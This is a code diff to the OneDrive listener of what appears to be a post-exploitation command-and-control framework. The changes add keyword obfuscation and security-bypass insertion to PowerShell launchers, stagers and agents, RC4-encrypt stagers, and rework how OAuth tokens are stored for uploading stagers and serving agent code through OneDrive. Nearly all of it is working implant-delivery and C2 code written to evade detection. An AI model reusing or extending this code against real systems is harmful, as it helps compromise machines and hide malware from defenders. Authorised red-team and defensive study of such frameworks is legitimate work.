@@ -226,10 +226,9 @@ class Listener(object):
             staging_key = listener_options["StagingKey"]["Value"]
 
             if language.startswith("power"):
-                launcher = "$ErrorActionPreference = 'SilentlyContinue';"  # Set as empty string for debugging
-
+                launcher = ""
                 if safeChecks.lower() == "true":
-                    launcher = "If($PSVersionTable.PSVersion.Major -ge 3){"
+                    launcher += "If($PSVersionTable.PSVersion.Major -ge 3){"
 
                     for bypass in bypasses:
                         launcher += bypass
@@ -293,6 +292,7 @@ class Listener(object):
                         launcher,
                         obfuscation_command=obfuscation_command,
                     )
+                    launcher = self.mainMenu.obfuscationv2.obfuscate_keywords(launcher)
 
                 if encode and (
                     (not obfuscate) or ("launcher" not in obfuscation_command.lower())
@@ -308,7 +308,14 @@ class Listener(object):
                 return "Python not implemented yet"
 
     def generate_stager(
-        self, listenerOptions, encode=False, encrypt=True, language=None, token=None
+        self,
+        listenerOptions,
+        encode=False,
+        encrypt=True,
+        language=None,
+        token=None,
+        obfuscate=False,
+        obfuscation_command="",
     ):
         """
         Generate the stager code
@@ -354,21 +361,24 @@ class Listener(object):
                 "taskings_folder": taskings_folder,
             }
             stager = template.render(template_options)
+            stager = listener_util.remove_lines_comments(stager)
 
-            # Get the random function name generated at install and patch the stager with the proper function name
-            stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-            unobfuscated_stager = listener_util.remove_lines_comments(stager)
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager, obfuscation_command=obfuscation_command
+                )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
             if encode:
-                return helpers.enc_powershell(unobfuscated_stager)
+                return helpers.enc_powershell(stager)
             elif encrypt:
                 RC4IV = os.urandom(4)
                 staging_key = staging_key.encode("UTF-8")
                 return RC4IV + encryption.rc4(
-                    RC4IV + staging_key, unobfuscated_stager.encode("UTF-8")
+                    RC4IV + staging_key, stager.encode("UTF-8")
                 )
             else:
-                return unobfuscated_stager
+                return stager
 
         else:
             log.error("Python agent not available for Onedrive")
@@ -376,11 +386,6 @@ class Listener(object):
     def generate_comms(
         self,
         listener_options,
-        client_id,
-        client_secret,
-        token,
-        refresh_token,
-        redirect_uri,
         language=None,
     ):
         client_id = listener_options["ClientID"]["Value"]
@@ -402,7 +407,7 @@ class Listener(object):
                 template = eng.get_template("onedrive/comms.ps1")
 
                 template_options = {
-                    "token:": token,
+                    "token:": self.token,
                     "refresh_token": refresh_token,
                     "client_id": client_id,
                     "client_secret": client_secret,
@@ -425,12 +430,9 @@ class Listener(object):
     def generate_agent(
         self,
         listener_options,
-        client_id,
-        client_secret,
-        token,
-        refresh_token,
-        redirect_uri,
         language=None,
+        obfuscate=False,
+        obfuscation_command="",
         version="",
     ):
         """
@@ -482,6 +484,12 @@ class Listener(object):
                 )
 
             agent_code = agent_code.replace("REPLACE_COMMS", "")
+
+            if obfuscate:
+                agent_code = self.mainMenu.obfuscationv2.obfuscate(
+                    agent_code, obfuscation_command=obfuscation_command
+                )
+                agent_code = self.mainMenu.obfuscationv2.obfuscate_keywords(agent_code)
 
             return agent_code
 
@@ -550,7 +558,7 @@ class Listener(object):
             return request.ok
 
         def setup_folders():
-            if not (test_token(token["access_token"])):
+            if not (test_token(self.token["access_token"])):
                 raise ValueError("Could not set up folders, access token invalid")
 
             base_object = s.get("%s/drive/root:/%s" % (base_url, base_folder))
@@ -627,7 +635,7 @@ class Listener(object):
             ps_stager = self.generate_stager(
                 listenerOptions=listener_options,
                 language="powershell",
-                token=token["access_token"],
+                token=self.token["access_token"],
             )
             r = s.put(
                 "%s/drive/root:/%s/%s/%s:/content"
@@ -672,12 +680,12 @@ class Listener(object):
         s = Session()
 
         if refresh_token:
-            token = renew_token(client_id, client_secret, refresh_token)
+            self.token = renew_token(client_id, client_secret, refresh_token)
             message = f"{listener_name}: Refreshed auth token"
             self.instance_log.info(message)
         else:
             try:
-                token = get_token(client_id, client_secret, auth_code)
+                self.token = get_token(client_id, client_secret, auth_code)
             except Exception:
                 self.instance_log.error(
                     f"{listener_name}: Unable to retrieve OneDrive Token"
@@ -687,7 +695,7 @@ class Listener(object):
             message = f"{listener_name} Got new auth token"
             self.instance_log.info(message)
 
-        s.headers["Authorization"] = "Bearer " + token["access_token"]
+        s.headers["Authorization"] = "Bearer " + self.token["access_token"]
 
         setup_folders()
 
@@ -707,24 +715,24 @@ class Listener(object):
             time.sleep(int(poll_interval))
             try:  # Wrap the whole loop in a try/catch so one error won't kill the listener
                 if (
-                    time.time() > token["expires_at"]
+                    time.time() > self.token["expires_at"]
                 ):  # Get a new token if the current one has expired
-                    token = renew_token(
-                        client_id, client_secret, token["refresh_token"]
-                    )
-                    s.headers["Authorization"] = "Bearer " + token["access_token"]
+                    renew_token(client_id, client_secret, self.token["refresh_token"])
+                    s.headers["Authorization"] = "Bearer " + self.token["access_token"]
                     message = f"{listener_name} Refreshed auth token"
                     self.instance_log.info(message)
                     upload_stager()
-                if token["update"]:
+                if self.token["update"]:
                     with SessionLocal.begin() as db:
-                        self.options["RefreshToken"]["Value"] = token["refresh_token"]
+                        self.options["RefreshToken"]["Value"] = self.token[
+                            "refresh_token"
+                        ]
                         db_listener = self.mainMenu.listenersv2.get_by_name(
                             db, listener_name
                         )
                         db_listener.options = self.options
 
-                    token["update"] = False
+                    self.token["update"] = False
 
                 search = s.get(
                     "%s/drive/root:/%s/%s?expand=children"
@@ -773,18 +781,13 @@ class Listener(object):
                             session_key = self.mainMenu.agents.agents[agent_name][
                                 "sessionKey"
                             ]
-                            agent_token = renew_token(
-                                client_id, client_secret, token["refresh_token"]
+                            renew_token(
+                                client_id, client_secret, self.token["refresh_token"]
                             )  # Get auth and refresh tokens for the agent to use
                             agent_code = str(
                                 self.generate_agent(
                                     listener_options,
-                                    client_id,
-                                    client_secret,
-                                    agent_token["access_token"],
-                                    agent_token["refresh_token"],
-                                    redirect_uri,
-                                    lang,
+                                    language=lang,
                                 )
                             )
 
